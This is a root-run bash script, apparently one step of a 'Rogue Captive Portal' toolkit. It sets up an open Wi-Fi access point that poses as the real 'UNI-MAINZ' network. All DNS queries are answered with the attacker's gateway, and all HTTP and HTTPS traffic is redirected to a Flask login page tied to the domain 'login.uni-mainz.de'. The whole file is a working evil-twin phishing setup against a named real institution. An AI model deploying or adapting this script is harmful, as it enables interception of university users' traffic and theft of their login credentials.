#!/bin/bash

# Rogue Captive Portal - Configure Services
# This script configures hostapd, dnsmasq, network interface, and iptables

# Variables
SSID="UNI-MAINZ"
INTERFACE="wlan0"
ETHERNET="eth0"
GATEWAY_IP="192.168.10.1"
DHCP_RANGE_START="192.168.10.10"
DHCP_RANGE_END="192.168.10.100"
FLASK_PORT=8080
DOMAIN="login.uni-mainz.de"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root${NC}" 
   exit 1
fi

# Function to print status messages
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Configure hostapd (Wi-Fi Access Point)
configure_hostapd() {
    print_status "Configuring hostapd..."
    
    # Create directory if it doesn't exist
    mkdir -p /etc/hostapd
    
    cat <<EOF > /etc/hostapd/hostapd.conf
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF
    
    # Set the config file location (handle both systemd and init.d)
    if [ -f /etc/default/hostapd ]; then
        sed -i 's|#DAEMON_CONF=""|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd 2>/dev/null || true
        sed -i 's|DAEMON_CONF=".*"|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd 2>/dev/null || true
    fi
    
    print_status "hostapd configured"
}

# Configure dnsmasq (DHCP and DNS server)
configure_dnsmasq() {
    print_status "Configuring dnsmasq..."
    
    # Backup original config
    if [ -f /etc/dnsmasq.conf ] && [ ! -f /etc/dnsmasq.conf.backup ]; then
        mv /etc/dnsmasq.conf /etc/dnsmasq.conf.backup
        print_status "Backed up original dnsmasq.conf"
    fi
    
    cat <<EOF > /etc/dnsmasq.conf
# Interface to bind to
interface=$INTERFACE

# DHCP range
dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,255.255.255.0,12h

# Gateway
dhcp-option=3,$GATEWAY_IP

# DNS Server
dhcp-option=6,$GATEWAY_IP

# Redirect all DNS queries to our IP
address=/#/$GATEWAY_IP

# Log queries
log-queries
log-dhcp

# Don't read /etc/resolv.conf
no-resolv

# Don't poll /etc/resolv.conf
no-poll
EOF
    
    print_status "dnsmasq configured"
}

# Configure network interface
configure_network() {
    print_status "Configuring network interface..."
    
    # Check if interface exists
    if ! ip link show $INTERFACE &> /dev/null; then
        print_error "Interface $INTERFACE does not exist!"
        print_status "Available interfaces:"
        ip link show | grep -E "^[0-9]+:" | awk '{print $2}' | sed 's/://'
        exit 1
    fi
    
    # Bring down the interface
    ip link set dev $INTERFACE down 2>/dev/null || true
    
    # Set interface up
    ip link set dev $INTERFACE up
    
    # Assign static IP
    ip addr flush dev $INTERFACE
    ip addr add $GATEWAY_IP/24 dev $INTERFACE
    ip link set dev $INTERFACE up
    
    print_status "Network interface configured with IP $GATEWAY_IP"
}

# Enable IP forwarding and configure iptables
configure_iptables() {
    print_status "Configuring iptables and IP forwarding..."
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Make IP forwarding persistent (handle missing sysctl.conf)
    if [ -f /etc/sysctl.conf ]; then
        if grep -q "net.ipv4.ip_forward" /etc/sysctl.conf; then
            sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
            sed -i 's/net.ipv4.ip_forward=0/net.ipv4.ip_forward=1/' /etc/sysctl.conf
        else
            echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
        fi
    else
        # Create sysctl.conf if it doesn't exist
        print_warning "/etc/sysctl.conf not found, creating it..."
        mkdir -p /etc
        echo "net.ipv4.ip_forward=1" > /etc/sysctl.conf
    fi
    
    # Flush existing rules
    iptables -F
    iptables -t nat -F
    iptables -t mangle -F
    iptables -X
    
    # Allow established connections
    iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    
    # Allow traffic on loopback
    iptables -A INPUT -i lo -j ACCEPT
    
    # Allow DHCP and DNS
    iptables -A INPUT -p udp --dport 67 -j ACCEPT
    iptables -A INPUT -p udp --dport 53 -j ACCEPT
    iptables -A INPUT -p tcp --dport 53 -j ACCEPT
    
    # Allow HTTP/HTTPS traffic to our Flask app
    iptables -A INPUT -p tcp --dport 80 -j ACCEPT
    iptables -A INPUT -p tcp --dport 443 -j ACCEPT
    iptables -A INPUT -p tcp --dport $FLASK_PORT -j ACCEPT
    
    # Redirect all HTTP traffic to our Flask app
    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port $FLASK_PORT
    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j REDIRECT --to-port $FLASK_PORT
    
    # NAT for internet access (if you want to provide internet)
    # Uncomment the following line if you want to provide internet access through eth0
    # iptables -t nat -A POSTROUTING -o $ETHERNET -j MASQUERADE
    
    # Save iptables rules
    mkdir -p /etc/iptables
    if command -v iptables-save &> /dev/null; then
        iptables-save > /etc/iptables/rules.v4
        print_status "iptables rules saved"
    fi
    
    print_status "iptables configured"
}

# Enable services
enable_services() {
    print_status "Enabling services to start on boot..."
    
    systemctl unmask hostapd 2>/dev/null || true
    systemctl enable hostapd 2>/dev/null || true
    systemctl enable dnsmasq 2>/dev/null || true
    
    print_status "Services enabled"
}

# Main configuration function
main() {
    echo -e "${GREEN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║   Configuring Services                ║"
    echo "║   Rogue Captive Portal                ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
    
    configure_network
    configure_hostapd
    configure_dnsmasq
    configure_iptables
    enable_services
    
    echo ""
    print_status "All services configured successfully!"
    echo -e "${GREEN}Next step: Run ${YELLOW}./3_check_status.sh${GREEN} to verify configuration${NC}"
    echo -e "${GREEN}Then run: ${YELLOW}./4_run_rogue_ap.sh${GREEN} to start the access point${NC}"
}

# Run main function
main
